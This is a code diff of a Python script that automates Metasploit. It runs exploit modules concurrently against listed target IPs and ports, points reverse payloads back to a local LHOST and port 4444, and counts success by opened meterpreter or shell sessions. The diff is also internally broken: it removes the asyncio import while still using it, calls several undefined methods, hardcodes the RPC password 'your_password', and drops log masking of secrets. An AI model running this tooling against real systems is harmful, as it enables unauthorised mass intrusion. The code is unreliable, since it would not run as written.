@@ -1,33 +1,30 @@
-import asyncio
 import json
-import os
 import sys
-import xml.etree.ElementTree as ET
-from typing import Dict, List, Optional, Any
-from datetime import datetime
+import time
+from typing import Dict, List, Optional, Tuple
+from pymetasploit3.msfrpc import MsfRpcClient
+import logging
+import socket
+import netifaces
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass
 from enum import Enum
-from pymetasploit3.msfrpc import MsfRpcClient
-from contextlib import asynccontextmanager
-import logging
-import re
-from logging.handlers import RotatingFileHandler
 import queue
+import traceback
+from datetime import datetime
 
-# Configuration and Constants
-MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
-MAX_LOG_FILES = 5
-
+# カスタム例外クラス
 class PentestAutomationError(Exception):
     """Base exception for pentest automation"""
     pass
 
-class ConfigurationError(PentestAutomationError):
-    """Configuration related errors"""
-    pass
-
 class ConnectionError(PentestAutomationError):
     """Connection related errors"""
+    pass
+
+class PayloadError(PentestAutomationError):
+    """Payload related errors"""
     pass
 
 class ExploitError(PentestAutomationError):
@@ -38,29 +35,14 @@ class ValidationError(PentestAutomationError):
     """Data validation related errors"""
     pass
 
+# 実行状態を表すEnum
 class ExploitStatus(Enum):
     SUCCESS = "success"
     FAILURE = "failure"
     TIMEOUT = "timeout"
     ERROR = "error"
 
-@dataclass
-class ExploitConfiguration:
-    target_ip: str
-    target_port: int
-    module_path: str
-    cve: str
-    options: Dict[str, Any]
-    timeout: Optional[int] = None
-    retry_count: int = 3
-
-    def validate(self) -> bool:
-        if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", self.target_ip):
-            return False
-        if not (1 <= self.target_port <= 65535):
-            return False
-        return all([self.module_path, self.cve])
-
+# 実行結果を格納するデータクラス
 @dataclass
 class ExploitResult:
     target_ip: str
@@ -71,173 +53,284 @@ class ExploitResult:
     message: str
     timestamp: datetime
     execution_time: float
-    session_id: Optional[str] = None
 
-class SecureLogger:
-    """Enhanced secure logging functionality"""
+class PentestAutomation:
+    def __init__(self, result_file: str, lhost: Optional[str] = None, 
+                 lport: int = 4444, max_workers: int = 5,
+                 default_timeout: int = 30):
+        """
+        Enhanced initialization with thread pool and timeout settings
+        """
+        self.result_file = result_file
+        self.max_workers = max_workers
+        self.default_timeout = default_timeout
+        self.results_queue = queue.Queue()
+        
+        # Set up enhanced logging
+        self._setup_logging()
+        
+        try:
+            self.lhost = lhost or self._get_local_ip()
+            self.lport = lport
+            self.results = self._load_results()
+            self.client = MsfRpcClient('your_password')
+            
+            self.logger.info(f"""Initialization completed:
+                - Local host: {self.lhost}
+                - Local port: {self.lport}
+                - Max workers: {max_workers}
+                - Default timeout: {default_timeout}s
+                - Total targets: {len(self.results)}
+            """)
+            
+        except Exception as e:
+            self.logger.critical(f"Critical error during initialization: {str(e)}")
+            self.logger.debug(f"Detailed traceback: {traceback.format_exc()}")
+            raise ConnectionError(f"Failed to initialize: {str(e)}")
 
-    def __init__(self, name: str, log_dir: str = "logs"):
-        self.logger = logging.getLogger(name)
+    def _setup_logging(self):
+        """Enhanced logging setup with both file and console handlers"""
+        self.logger = logging.getLogger(__name__)
         self.logger.setLevel(logging.DEBUG)
-
-        os.makedirs(log_dir, exist_ok=True)
-        log_file = os.path.join(log_dir, f'{name}_{datetime.now().strftime("%Y%m%d")}.log')
-        file_handler = RotatingFileHandler(
-            log_file,
-            maxBytes=MAX_LOG_SIZE,
-            backupCount=MAX_LOG_FILES,
-            mode='a'
-        )
-        file_handler.setLevel(logging.DEBUG)
-
-        console_handler = logging.StreamHandler()
-        console_handler.setLevel(logging.INFO)
-
+        
+        # Create formatters
         file_formatter = logging.Formatter(
             '%(asctime)s - %(levelname)s - %(threadName)s - %(message)s'
         )
         console_formatter = logging.Formatter(
             '%(asctime)s - %(levelname)s - %(message)s'
         )
-
+        
+        # File handler (detailed logging)
+        file_handler = logging.FileHandler(
+            f'pentest_automation_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
+        )
+        file_handler.setLevel(logging.DEBUG)
         file_handler.setFormatter(file_formatter)
+        
+        # Console handler (info level)
+        console_handler = logging.StreamHandler()
+        console_handler.setLevel(logging.INFO)
         console_handler.setFormatter(console_formatter)
-
+        
         self.logger.addHandler(file_handler)
         self.logger.addHandler(console_handler)
 
-    def _mask_sensitive_info(self, message: str) -> str:
-        patterns = [
-            (r'password["\\s]*:["\\s]*[^"}\\s]+', 'password: *****'),
-            (r'session[_\\s]?id["\\s]*:["\\s]*[^"}\\s]+', 'session_id: *****'),
-            (r'token["\\s]*:["\\s]*[^"}\\s]+', 'token: *****'),
-            (r'\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b', '[MASKED_IP]')
-        ]
-        for pattern, replacement in patterns:
-            message = re.sub(pattern, replacement, message, flags=re.IGNORECASE)
-        return message
-
-    def info(self, message: str):
-        self.logger.info(self._mask_sensitive_info(message))
-
-    def error(self, message: str):
-        self.logger.error(self._mask_sensitive_info(message))
-
-class PentestAutomation:
-    def __init__(self, config_path: str, max_concurrent_exploits: int = 5):
-        """Initialize with configuration file and max concurrency for exploits"""
-        self.logger = SecureLogger(__name__)
-        self.config = self._load_config(config_path)
-        self.results_queue: queue.Queue = queue.Queue()
-        self.active_sessions: Dict[str, Any] = {}
-        self._initialize_connection()
-        self.semaphore = asyncio.Semaphore(max_concurrent_exploits)
-
-    def _load_config(self, config_path: str) -> Dict:
-        """Load configuration from JSON file"""
+    async def run_exploit_with_timeout(self, target_ip: str, target_port: int, 
+                                     module_path: str, options: Dict,
+                                     platform: str = "windows",
+                                     timeout: Optional[int] = None) -> ExploitResult:
+        """
+        Enhanced exploit execution with timeout and detailed result tracking
+        """
+        start_time = time.time()
+        timeout = timeout or self.default_timeout
+        
         try:
-            with open(config_path, 'r') as f:
-                config = json.load(f)
-
-            required_fields = ['msf_host', 'msf_port', 'msf_password', 'lhost', 'lport']
-            for field in required_fields:
-                if field not in config:
-                    raise ConfigurationError(f"Missing required configuration field: {field}")
-
-            return config
-        except Exception as e:
-            raise ConfigurationError(f"Failed to load configuration: {str(e)}")
-
-    def _initialize_connection(self):
-        """Initialize connection to Metasploit RPC server"""
-        try:
-            self.client = MsfRpcClient(
-                password=self.config['msf_password'],
-                server=self.config['msf_host'],
-                port=self.config['msf_port']
+            self.logger.info(f"Starting exploit execution for {target_ip}:{target_port}")
+            
+            # Create new console with timeout
+            console = self.client.consoles.console()
+            module = self.client.modules.use('exploit', module_path)
+            
+            # Get and validate payload
+            payload_path = await self.get_suitable_payload(module_path, platform)
+            if not payload_path:
+                raise PayloadError(f"No suitable payload found for {platform}")
+            
+            self.logger.debug(f"Selected payload: {payload_path}")
+            
+            # Configure exploit
+            module['RHOSTS'] = target_ip
+            module['RPORT'] = target_port
+            module['PAYLOAD'] = payload_path
+            module['LHOST'] = self.lhost
+            module['LPORT'] = self.lport
+            
+            # Set additional options
+            for opt, value in options.items():
+                if opt not in ['RHOSTS', 'RPORT', 'PAYLOAD', 'LHOST', 'LPORT']:
+                    module[opt] = value
+            
+            # Execute with timeout
+            result = await asyncio.wait_for(
+                self._execute_exploit(module, console),
+                timeout=timeout
             )
-            self.logger.info("Successfully connected to Metasploit RPC server")
-        except Exception as e:
-            raise ConnectionError(f"Failed to connect to Metasploit RPC server: {str(e)}")
-
-    def parse_scan_results(self, file_path: str) -> List[Dict[str, Any]]:
-        """Parse the Nmap scan XML file to extract IP, port, and CVE information."""
-        results = []
-        try:
-            tree = ET.parse(file_path)
-            root = tree.getroot()
             
-            # IPアドレスとポート、CVE番号の抽出
-            for host in root.findall('host'):
-                ip_address = host.find('address').get('addr')
-                for port in host.findall('.//port'):
-                    port_number = int(port.get('portid'))
-                    for script in port.findall('script'):
-                        if script.get('id') == 'vulners':
-                            for elem in script.findall('.//elem'):
-                                cve = elem.text
-                                if cve and cve.startswith('CVE'):
-                                    results.append({
-                                        'ip': ip_address,
-                                        'port': port_number,
-                                        'cve': cve
-                                    })
-            return results
-        except Exception as e:
-            self.logger.error(f"Failed to parse scan results: {str(e)}")
-            return []
-
-    def find_exploits_for_cve(self, cve: str) -> List[str]:
-        """Find Metasploit modules that support the specified CVE."""
-        matching_modules = []
-        try:
-            for module in self.client.modules.exploits:
-                module_info = self.client.modules.use('exploit', module).info
-                if 'cve' in module_info and cve in module_info['cve']:
-                    matching_modules.append(module)
-            self.logger.info(f"Found {len(matching_modules)} exploit(s) for CVE {cve}")
-            return matching_modules
-        except Exception as e:
-            self.logger.error(f"Failed to find exploits for CVE {cve}: {str(e)}")
-            return []
-
-    async def run_exploits_from_scan_results(self, scan_results: List[Dict[str, Any]]):
-        """Run exploits on each target based on the scan results and CVE mappings."""
-        for result in scan_results:
-            target_ip = result['ip']
-            target_port = result['port']
-            cve = result['cve']
+            execution_time = time.time() - start_time
             
-            # CVE番号に対応するエクスプロイトモジュールを検索
-            exploit_modules = self.find_exploits_for_cve(cve)
-            for module_path in exploit_modules:
-                config = ExploitConfiguration(
-                    target_ip=target_ip,
-                    target_port=target_port,
-                    module_path=module_path,
-                    cve=cve,
-                    options={},  # 必要なオプションを指定
-                    timeout=30,
-                    retry_count=3
-                )
-                result = await self.run_exploit_with_retry(config)
-                self.logger.info(f"Exploit result for {cve} on {target_ip}:{target_port} using {module_path}: {result.status}")
+            if result:
+                status = ExploitStatus.SUCCESS
+                message = "Exploit completed successfully"
+            else:
+                status = ExploitStatus.FAILURE
+                message = "Exploit failed to achieve expected result"
+            
+        except asyncio.TimeoutError:
+            status = ExploitStatus.TIMEOUT
+            message = f"Exploit execution timed out after {timeout} seconds"
+            execution_time = timeout
+            
+        except Exception as e:
+            status = ExploitStatus.ERROR
+            message = f"Error during exploit execution: {str(e)}"
+            execution_time = time.time() - start_time
+            self.logger.error(f"Detailed error: {traceback.format_exc()}")
+            
+        finally:
+            if 'console' in locals():
+                console.destroy()
+        
+        # Create and return result object
+        result = ExploitResult(
+            target_ip=target_ip,
+            target_port=target_port,
+            cve=options.get('cve', 'Unknown'),
+            module_path=module_path,
+            status=status,
+            message=message,
+            timestamp=datetime.now(),
+            execution_time=execution_time
+        )
+        
+        self.results_queue.put(result)
+        return result
+
+    async def _execute_exploit(self, module, console) -> bool:
+        """Separated exploit execution logic for better error handling"""
+        try:
+            sessions_before = len(self.client.sessions.list)
+            
+            # Execute exploit
+            exploit_result = module.execute()
+            
+            # Initial wait for session
+            await asyncio.sleep(5)
+            
+            # Check for new session
+            if len(self.client.sessions.list) > sessions_before:
+                self.logger.info("Session established successfully")
+                return True
+            
+            # Check console output
+            output = console.read()
+            success_indicators = [
+                'session opened',
+                'success',
+                'meterpreter session',
+                'command shell session'
+            ]
+            
+            return any(indicator in output.lower() for indicator in success_indicators)
+            
+        except Exception as e:
+            self.logger.error(f"Error during exploit execution: {str(e)}")
+            raise ExploitError(f"Exploit execution failed: {str(e)}")
+
+    async def process_target(self, result: Dict) -> ExploitResult:
+        """Process individual target with enhanced error handling"""
+        try:
+            self.logger.info(f"Processing target: {result['ip']}:{result['port']}")
+            
+            # Validate target data
+            if not self._validate_target_data(result):
+                raise ValidationError(f"Invalid target data: {result}")
+            
+            # Determine target platform
+            platform = self._detect_platform(result['service'])
+            self.logger.debug(f"Detected platform: {platform}")
+            
+            # Search for exploit
+            module_path = await self.search_exploit(result['cve'])
+            if not module_path:
+                raise ExploitError(f"No suitable exploit found for {result['cve']}")
+            
+            # Get exploit options
+            options = await self.get_module_options(module_path)
+            
+            # Execute exploit
+            return await self.run_exploit_with_timeout(
+                result['ip'],
+                result['port'],
+                module_path,
+                options,
+                platform
+            )
+            
+        except Exception as e:
+            self.logger.error(f"Error processing target: {str(e)}")
+            self.logger.debug(f"Detailed error: {traceback.format_exc()}")
+            
+            return ExploitResult(
+                target_ip=result.get('ip', 'Unknown'),
+                target_port=result.get('port', 0),
+                cve=result.get('cve', 'Unknown'),
+                module_path='',
+                status=ExploitStatus.ERROR,
+                message=str(e),
+                timestamp=datetime.now(),
+                execution_time=0
+            )
+
+    async def process_results(self):
+        """Enhanced multi-threaded results processing"""
+        self.logger.info(f"Starting processing of {len(self.results)} targets")
+        
+        tasks = []
+        async with asyncio.Semaphore(self.max_workers):
+            for result in self.results:
+                task = asyncio.create_task(self.process_target(result))
+                tasks.append(task)
+            
+            completed_results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # Process and summarize results
+        self._summarize_results(completed_results)
+
+    def _summarize_results(self, results: List[ExploitResult]):
+        """Summarize execution results"""
+        summary = {status: 0 for status in ExploitStatus}
+        total_time = 0
+        
+        for result in results:
+            summary[result.status] += 1
+            total_time += result.execution_time
+        
+        self.logger.info(f"""
+        Execution Summary:
+        -----------------
+        Total targets: {len(results)}
+        Successful exploits: {summary[ExploitStatus.SUCCESS]}
+        Failed exploits: {summary[ExploitStatus.FAILURE]}
+        Timeouts: {summary[ExploitStatus.TIMEOUT]}
+        Errors: {summary[ExploitStatus.ERROR]}
+        Total execution time: {total_time:.2f} seconds
+        Average time per target: {total_time/len(results):.2f} seconds
+        """)
 
 async def main():
-    if len(sys.argv) != 3:
-        print("Usage: python pentest_automation.py <config.json> <nmap-vulners.xml>")
+    if len(sys.argv) not in [2, 3, 4]:
+        print("""
+        Usage: python pentest_automation.py <results_file.json> [lhost] [lport]
+        Optional arguments:
+        --max-workers <int>: Maximum number of concurrent workers (default: 5)
+        --timeout <int>: Default timeout in seconds (default: 30)
+        """)
         sys.exit(1)
-
-    config_path = sys.argv[1]
-    scan_results_path = sys.argv[2]
-
-    automation = PentestAutomation(config_path=config_path)
     
-    # スキャン結果を解析してCVE、IP、ポート情報を抽出
-    scan_results = automation.parse_scan_results(scan_results_path)
-    
-    # 抽出したスキャン結果を使ってエクスプロイトを実行
-    await automation.run_exploits_from_scan_results(scan_results)
+    try:
+        result_file = sys.argv[1]
+        lhost = sys.argv[2] if len(sys.argv) > 2 else None
+        lport = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
+        
+        automation = PentestAutomation(result_file, lhost, lport)
+        await automation.process_results()
+        
+    except Exception as e:
+        logging.error(f"Critical error in main: {str(e)}")
+        logging.debug(f"Detailed traceback: {traceback.format_exc()}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     asyncio.run(main())
